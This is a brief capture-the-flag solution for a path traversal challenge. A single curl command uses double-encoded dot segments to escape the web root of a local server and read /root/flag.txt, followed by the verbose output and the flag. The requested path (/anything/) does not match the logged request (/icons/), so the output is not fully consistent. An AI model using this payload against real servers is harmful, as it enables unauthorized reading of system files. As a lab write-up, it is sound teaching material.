#Solution

1. Run this command to get the flag.
```
$ curl -v --path-as-is http://localhost:1337/anything/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/root/flag.txt
*   Trying 127.0.0.1:1337...
* Connected to localhost (127.0.0.1) port 1337 (#0)
> GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/root/flag.txt HTTP/1.1
> Host: localhost:1337
...
...
...
< Content-Type: text/plain
<
* Connection #0 to host localhost left intact
YCEP24{P4th_tR4v3rs4l_24sft4sgw}
```

Flag: YCEP24{P4th_tR4v3rs4l_24sft4sgw}